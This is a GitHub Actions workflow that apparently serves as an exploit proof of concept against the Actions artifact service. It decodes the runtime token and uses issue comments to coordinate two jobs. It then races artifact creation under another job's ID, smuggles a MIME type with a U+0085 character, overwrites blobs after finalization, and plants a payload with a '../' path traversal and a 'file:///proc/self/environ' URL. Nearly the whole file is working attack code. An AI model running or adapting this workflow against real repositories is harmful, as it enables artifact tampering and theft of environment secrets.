name: Repo Cassette cross-job artifact race

on:
  workflow_dispatch:

permissions:
  actions: read
  contents: read
  issues: write

jobs:
  prepare:
    runs-on: ubuntu-latest
    outputs:
      issue_number: ${{ steps.issue.outputs.number }}
    steps:
      - name: Create a temporary coordination issue
        id: issue
        uses: actions/github-script@v8
        with:
          script: |
            const result = await github.rest.issues.create({
              ...context.repo,
              title: `temporary cross-job probe ${context.runId}`,
              body: 'Temporary synchronization marker for a GitHub Actions artifact API probe.'
            });
            core.setOutput('number', String(result.data.number));

  race:
    needs: prepare
    runs-on: ubuntu-latest
    timeout-minutes: 12
    strategy:
      fail-fast: false
      matrix:
        role: [old, new]
    env:
      GITHUB_TOKEN: ${{ github.token }}
      ISSUE_NUMBER: ${{ needs.prepare.outputs.issue_number }}
      ROLE: ${{ matrix.role }}
    steps:
      - name: Coordinate jobs and race artifact metadata
        uses: actions/github-script@v8
        with:
          script: |
            const {createHash} = require('node:crypto');
            const token = process.env.ACTIONS_RUNTIME_TOKEN;
            const resultsUrl = process.env.ACTIONS_RESULTS_URL;
            if (!token || !resultsUrl) throw new Error('Actions runtime artifact credentials unavailable');
            const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
            const scope = claims.scp.split(' ').find(value => value.startsWith('Actions.Results:'));
            if (!scope) throw new Error('Actions.Results scope missing');
            const [, runBackendId, ownJobBackendId] = scope.split(':');
            const service = new URL(resultsUrl).origin + '/twirp/github.actions.results.api.v1.ArtifactService/';
            const role = process.env.ROLE;
            const runId = process.env.GITHUB_RUN_ID;
            const repo = process.env.GITHUB_REPOSITORY;
            const issueNumber = process.env.ISSUE_NUMBER;
            const wait = ms => new Promise(resolve => setTimeout(resolve, ms));
            const api = async (path, options = {}) => {
              const response = await fetch(`https://api.github.com${path}`, {
                ...options,
                headers: {
                  Authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
                  Accept: 'application/vnd.github+json',
                  'Content-Type': 'application/json',
                  ...(options.headers || {})
                }
              });
              if (!response.ok) throw new Error(`GitHub API ${response.status}: ${(await response.text()).slice(0, 200)}`);
              return response.status === 204 ? null : response.json();
            };
            const rpc = async (method, body) => {
              const response = await fetch(service + method, {
                method: 'POST',
                headers: {Authorization: `Bearer ${token}`, 'Content-Type': 'application/json'},
                body: JSON.stringify(body)
              });
              return {status: response.status, data: await response.json().catch(() => ({}))};
            };
            const marker = `XJOB ${runId} ${role} ${runBackendId} ${ownJobBackendId}`;
            await api(`/repos/${repo}/issues/${issueNumber}/comments`, {
              method: 'POST', body: JSON.stringify({body: marker})
            });
            let peers;
            for (let attempt = 0; attempt < 60; attempt++) {
              const comments = await api(`/repos/${repo}/issues/${issueNumber}/comments?per_page=100`);
              peers = Object.fromEntries(comments.map(comment => String(comment.body).trim().split(/\s+/))
                .filter(parts => parts.length === 5 && parts[0] === 'XJOB' && parts[1] === runId)
                .map(parts => [parts[2], {run: parts[3], job: parts[4]}]));
              if (peers.old && peers.new) break;
              await wait(1000);
            }
            if (!peers?.old || !peers?.new) throw new Error('Cross-job coordination timed out');
            const targetJobBackendId = peers.new.job;
            if (peers.old.run !== runBackendId || peers.new.run !== runBackendId) throw new Error('Runtime run backend IDs differ');

            const run = await api(`/repos/${repo}/actions/runs/${runId}`);
            let startAt = Date.parse(run.created_at) + 90000;
            if (startAt < Date.now() + 3000) startAt = Math.ceil(Date.now() / 30000) * 30000 + 30000;
            core.info(`READY role=${role} run_backend=${runBackendId} own_job_backend=${ownJobBackendId} target_job_backend=${targetJobBackendId} start=${new Date(startAt).toISOString()}`);
            await wait(Math.max(0, startAt - Date.now()));

            const badMime = `application/json\u0085`;
            async function putBlob(url, bytes) {
              const response = await fetch(url, {
                method: 'PUT',
                headers: {
                  'x-ms-blob-type': 'BlockBlob',
                  'x-ms-version': '2023-11-03',
                  'Content-Type': 'application/octet-stream'
                },
                body: bytes
              });
              if (!response.ok) throw new Error(`Azure upload ${response.status} ${(response.headers.get('x-ms-error-code') || '').slice(0, 80)}`);
            }
            async function inspect(artifactId, expected) {
              const response = await fetch(`https://api.github.com/repos/${repo}/actions/artifacts/${artifactId}/zip`, {
                headers: {Authorization: `Bearer ${process.env.GITHUB_TOKEN}`, Accept: 'application/vnd.github.v3+json'},
                redirect: 'manual'
              });
              if (response.status !== 302) return `api_status=${response.status}`;
              const location = response.headers.get('location');
              if (!location) return 'missing_location';
              const signed = new URL(location);
              const downloaded = await fetch(location);
              const bytes = Buffer.from(await downloaded.arrayBuffer());
              const type = downloaded.headers.get('content-type') || '';
              const media = type.split(',', 1)[0].split(';', 1)[0];
              const jsTrim = media.trim().toLowerCase();
              const pyTrim = media.replace(/^[\x09-\x0d\x1c-\x20\x85\xa0]+|[\x09-\x0d\x1c-\x20\x85\xa0]+$/g, '').toLowerCase();
              let parsed = false;
              try { const obj = JSON.parse(bytes.toString('utf8')); parsed = !!obj && typeof obj.full_name === 'string' && obj.owner?.avatar_url === 'file:///proc/self/environ'; }
              catch {}
              return `api_status=${response.status} final_status=${downloaded.status} type=${JSON.stringify(type)} type_codepoints=${[...type].map(c => c.codePointAt(0).toString(16)).join(',')} rsct=${JSON.stringify(signed.searchParams.getAll('rsct'))} bytes=${bytes.length} body_match=${bytes.equals(expected)} parsed_payload=${parsed} node_json=${jsTrim === 'application/json'} python_json=${pyTrim === 'application/json'}`;
            }

            for (let i = 0; i < 20; i++) {
              const name = `xjob-${runId}-${i}`;
              const version = role === 'old' ? 6 : 7;
              const mime = role === 'old' ? badMime : 'application/json';
              const created = await rpc('CreateArtifact', {
                workflow_run_backend_id: runBackendId,
                workflow_job_run_backend_id: targetJobBackendId,
                name, version, mime_type: mime
              });
              if (created.status !== 200 || created.data.ok !== true) {
                core.info(`CREATE role=${role} i=${i} status=${created.status} ok=${created.data.ok} reason=${String(created.data.msg || created.data.code || '').slice(0, 120)}`);
                continue;
              }
              const uploadUrl = created.data.signed_upload_url || created.data.signedUploadUrl;
              if (!uploadUrl) throw new Error('CreateArtifact returned no signed upload URL');
              const placeholder = Buffer.from('{}');
              try { await putBlob(uploadUrl, placeholder); }
              catch (error) { core.info(`UPLOAD role=${role} i=${i} error=${String(error.message).slice(0, 140)}`); continue; }
              await wait((i % 4) * 20);
              const hash = `sha256:${createHash('sha256').update(placeholder).digest('hex')}`;
              const finalized = await rpc('FinalizeArtifact', {
                workflow_run_backend_id: runBackendId,
                workflow_job_run_backend_id: targetJobBackendId,
                name, size: String(placeholder.length), hash
              });
              if (finalized.status !== 200 || finalized.data.ok !== true) {
                core.info(`FINALIZE role=${role} i=${i} status=${finalized.status} ok=${finalized.data.ok} reason=${String(finalized.data.msg || finalized.data.code || '').slice(0, 120)}`);
                continue;
              }
              const artifactId = finalized.data.artifact_id || finalized.data.artifactId;
              if (!artifactId) throw new Error('FinalizeArtifact returned no artifact ID');
              const repository = `x/../${repo}/actions/artifacts/${artifactId}/zip`;
              const payload = Buffer.from(JSON.stringify({
                full_name: repository,
                owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'},
                description: `cross-job-${role}-${i}`,
                stargazers_count: 7
              }));
              try { await putBlob(uploadUrl, payload); }
              catch (error) { core.info(`REUPLOAD role=${role} i=${i} artifact=${artifactId} error=${String(error.message).slice(0, 140)}`); continue; }
              core.info(`ARTIFACT role=${role} i=${i} id=${artifactId} ${await inspect(artifactId, payload)}`);
            }

  cleanup:
    if: always()
    needs: [prepare, race]
    runs-on: ubuntu-latest
    permissions:
      issues: write
    steps:
      - name: Close the temporary coordination issue
        uses: actions/github-script@v8
        with:
          script: |
            const number = Number('${{ needs.prepare.outputs.issue_number }}');
            if (!number) { core.info('No coordination issue to close'); return; }
            await github.rest.issues.update({...context.repo, issue_number: number, state: 'closed'});


